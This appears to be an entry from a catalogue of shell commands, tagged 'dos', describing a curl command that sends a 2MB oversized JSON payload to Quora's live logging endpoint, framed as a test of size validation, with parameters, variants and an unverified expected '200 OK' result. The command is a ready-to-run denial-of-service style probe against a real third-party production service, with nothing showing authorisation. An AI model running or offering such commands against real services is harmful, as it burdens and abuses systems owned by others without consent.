---
id: cmd-oversized-log-001
data: >-
  curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d
  'json=%5B%22'$(python3 -c 'import urllib.parse, json;
  print(urllib.parse.quote(json.dumps([{"filler": "a" * 2000000}]))')'%5D'
tags:
  - http
  - post
  - dos
type: command
output: |-
  HTTP/1.1 200 OK
  Content-Type: application/json
  {"status":"ok"}
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.772Z'
verified: false
validated: true
submitted: true
---
# curl-send-oversized-log

## Command

```bash
curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d 'json=%5B%22'$(python3 -c 'import urllib.parse, json; print(urllib.parse.quote(json.dumps([{"filler": "a" * 2000000}]))')'%5D'
```

## Description

Sends a 2MB oversized JSON payload to test size validation in Quora's logging system.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-d` | Payload with dynamic URL-encoded JSON | Yes |
| `python3 -c ...` | Generates and encodes large JSON | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d 'json=...'$(python3 -c '...')
```

### Advanced Usage

```bash
curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d '...' --data-urlencode 'json@large.json'
```

## Expected Output

HTTP 200 OK, confirming large payload storage without rejection.

## Related

- [[commands/curl-send-normal-log]]
